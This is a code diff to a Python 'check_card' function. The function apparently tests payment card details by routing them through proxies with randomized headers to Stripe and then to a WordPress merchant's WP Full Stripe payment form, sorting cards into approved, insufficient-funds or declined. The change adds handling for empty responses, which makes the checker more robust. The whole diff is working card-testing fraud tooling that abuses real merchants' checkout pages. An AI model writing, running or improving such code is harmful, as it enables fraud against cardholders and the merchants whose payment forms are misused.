@@ -135,16 +135,22 @@ def check_card(cc_line, proxy_dict=None):
             },
             data=stripe_data,
             timeout=30
-        ).json()
+        )
 
-        if 'id' not in r:
-            err = r.get('error', {}).get('message', 'Unknown')
+        try:
+            r_json = r.json()
+        except (json.JSONDecodeError, ValueError):
+            elapsed = round(time.time() - start, 2)
+            return f"Error | Empty response from Stripe (HTTP {r.status_code}) | {elapsed}s"
+
+        if 'id' not in r_json:
+            err = r_json.get('error', {}).get('message', 'Unknown')
             elapsed = round(time.time() - start, 2)
             if 'insufficient' in err.lower():
                 return f"Approved | Insufficient Funds | {err} | {elapsed}s"
             return f"Declined | {err} | {elapsed}s"
 
-        pay = s.post(
+        pay_resp = s.post(
             f'{cfg["site_url"]}/wp-admin/admin-ajax.php',
             headers=_rand_headers(),
             data={
@@ -156,10 +162,16 @@ def check_card(cc_line, proxy_dict=None):
                 'wpfs-card-holder-name': name,
                 'wpfs-terms-of-use-accepted': '1',
                 'wpfs-custom-amount-index': '0',
-                'wpfs-stripe-payment-method-id': r['id']
+                'wpfs-stripe-payment-method-id': r_json['id']
             },
             timeout=30
-        ).json()
+        )
+
+        try:
+            pay = pay_resp.json()
+        except (json.JSONDecodeError, ValueError):
+            elapsed = round(time.time() - start, 2)
+            return f"Error | Empty response from merchant (HTTP {pay_resp.status_code}) | {elapsed}s"
 
         elapsed = round(time.time() - start, 2)
 
